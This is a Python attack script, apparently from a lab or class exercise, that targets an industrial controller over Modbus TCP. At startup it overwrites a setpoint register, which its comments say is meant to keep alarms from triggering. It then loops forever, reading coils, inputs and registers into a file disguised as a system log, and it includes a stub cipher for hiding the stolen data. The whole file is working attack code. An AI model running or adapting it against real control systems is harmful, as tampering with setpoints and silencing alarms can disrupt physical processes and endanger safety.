from datetime import datetime, timedelta
import os
import sys
import time
from pymodbus.client.tcp import ModbusTcpClient

#Take the target IP address as the only parameter for this program
ip = sys.argv[1]

#Set current targeted device
server = ModbusTcpClient(ip,port="5502")

#Change the known setpoint to prevent alarm triggering; comment in or out to show attack
server.write_register(9, 60)

def main():
    #Create a false log file

    #If the file name does not currently exist; TESTING WITH EASY-TO-ACCESS FILE
    if not os.path.exists("./testSyslog"):
        #f = open("~/.config/syslogs", "x")

        with open("./testSyslog", "x") as f:
            while 1:
                #Set the next execution to occur in one hour; TESTING WITH ONE SECOND
                nextEx = datetime.now() + timedelta(seconds=1)

                #DO THE MODBUS WRITING IN HERE TO WITHDRAW SENSITIVE INFO            
                # f.write(encryptInfo(stealInfo()))
                f.write(stealInfo())

                #Have the program sleep and wait for its designated time to execute
                while datetime.now() < nextEx:
                    time.sleep(1)
    #If the file name already exists
    else:
        #Append to the existing file; TESTING WITH EASY-TO-ACCESS FILE
        #f = open("~/.config/syslogs","a")
        
        with open("./testSyslog","a") as f:
            while 1:
                #Set the next execution to occur in one hour; TESTING WITH ONE SECOND
                nextEx = datetime.now() + timedelta(seconds=1)

                #DO THE MODBUS WRITING IN HERE TO WITHDRAW SENSITIVE INFO
                #f.write(encryptInfo(stealInfo()))
                f.write(stealInfo())

                #Have the program sleep and wait for its designated time to execute
                while datetime.now() < nextEx:
                    time.sleep(1)
        

def stealInfo():
    #Collect info from the server's registers; adjust COUNT to collect from more registers
    coilInfo = server.read_coils(address=0,count=10).bits
    discInputInfo = server.read_discrete_inputs(address=0,count=10).bits
    holdRegisterInfo = server.read_holding_registers(address=0,count=10).registers
    inpRegisterInfo = server.read_input_registers(address=0,count=10).registers

    clientInfo = f"{datetime.now()}:\n\tCoils = {coilInfo}\n\tDiscrete Inputs = {discInputInfo}\n\tHolding Registers = {holdRegisterInfo}\n\tInput Registers = {inpRegisterInfo}\n\n"

    #Return the extracted data
    return clientInfo

#Basic Caesar Cipher, more secure encryption can be implemented at attacker's will
#FINISH IMPLEMENTING
# def encryptInfo(info):
#     info = info.lower()
#     newInfo = ''
#     for i in range(len(info)):
#        newInfo += chr((ord(info[i]) - 90) % 26 + 97)

#     #Return the encrypted data
#     return newInfo

main()
